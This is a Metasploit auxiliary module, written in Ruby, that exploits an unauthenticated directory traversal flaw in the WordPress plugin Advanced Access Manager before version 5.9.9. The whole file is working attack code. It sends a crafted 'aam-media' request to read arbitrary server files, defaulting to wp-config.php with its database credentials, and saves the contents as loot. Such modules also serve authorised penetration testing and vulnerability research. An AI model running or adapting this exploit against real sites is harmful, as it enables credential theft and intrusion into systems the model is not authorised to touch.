##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Report
    include Msf::Exploit::Remote::HTTP::Wordpress
    include Msf::Auxiliary::Scanner
  
    def initialize(info = {})
      super(update_info(info,
                        'Name' => 'Advanced Access Manager < 5.9.9 - Unauthenticated Local File Inclusion',
                        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin 'Advanced Access Manager' plugin version < 5.9.9, allowing arbitrary file read with the web server privileges.
          This vulnerability was being actively exploited when it was discovered.
        },
                        'References' =>
                          [
                            ['CWE', '22'],
                            ['WPVDB', 'dfe62ff5-956c-4403-b3fd-55677628036b'],
                            ['URL', 'https://plugins.trac.wordpress.org/browser/advanced-access-manager/trunk/application/Core/Media.php?rev=2098838  ']
                          ],
                        'Author' =>
                          [
                            'Ov3rfly - Original Researcher', # Vulnerability discovery
                            'Daniel Winzen - Submitter', # Vulnerability discovery
                            'ThienNV - SunCSR Team' # Metasploit module
                          ],
                        'DisclosureDate' => 'Oct 13 2021',
                        'License' => MSF_LICENSE
  
            ))
  
      register_options(
        [
          OptString.new('FILEPATH', [true, 'The path to the file to download', 'wp-config.php'])
        ])
    end
  
    def check
      check_plugin_version_from_readme('advanced-access-manager', '5.9.8')
    end
  
    def run_host(ip)
      filename = datastore['FILEPATH']
      filename = filename[1, filename.length] if filename =~ /^\//
  
      res = send_request_cgi({
                               'method' => 'GET',
                               'uri' => normalize_uri(target_uri.path),
                               'vars_get' =>
                                 {
                                   'aam-media' => "#{filename}"
                                 }
                             })
  
      fail_with Failure::Unreachable, 'Connection failed' unless res
      fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200
  
      print_status('Downloading file...')
      print_line("\n#{res.body}\n")
  
      fname = datastore['FILEPATH']
  
      path = store_loot(
        'wp_advance_access_manager.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )
      print_good("File saved in: #{path}")
    end
  end
  
